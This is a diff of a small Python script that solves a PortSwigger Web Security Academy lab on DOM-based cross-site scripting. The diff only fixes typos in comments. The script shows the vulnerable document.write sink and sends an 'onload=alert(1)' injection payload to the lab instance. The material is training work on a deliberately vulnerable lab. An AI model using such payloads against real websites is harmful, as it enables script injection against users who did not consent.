@@ -8,13 +8,13 @@ Lab link: https://portswigger.net/web-security/cross-site-scripting/dom-based/la
 
 import requests
 
-# Vunlerable code found in page source: document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+# Vulnerable code found in page source: document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
 
                     
 
 
 lab_id = '0aff002d03c0076784e3793a003c005c' #change based on generated lab
-payload = 'hack" onload=alert(1)>' # search paramter is vulnerable to dom XSS using document.write (see code above)
+payload = 'hack" onload=alert(1)>' # search parameter is vulnerable to dom XSS using document.write (see code above)
 uri = f"https://{lab_id}.web-security-academy.net/?search={payload}" 
 
 r = requests.get(uri)
